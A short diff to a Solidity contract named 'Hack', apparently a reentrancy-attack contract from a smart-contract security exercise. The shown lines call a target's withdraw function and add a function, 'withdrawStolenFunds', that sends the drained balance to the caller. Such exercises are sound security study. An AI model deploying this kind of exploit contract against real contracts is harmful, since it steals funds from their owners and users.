@@ -49,7 +49,7 @@ contract Hack {
         reentrance.withdraw(contractValue);
     }
 
-    function showBalance() public view returns (uint256) {
-        return address(this).balance;
+    function withdrawStolenFunds() external {
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
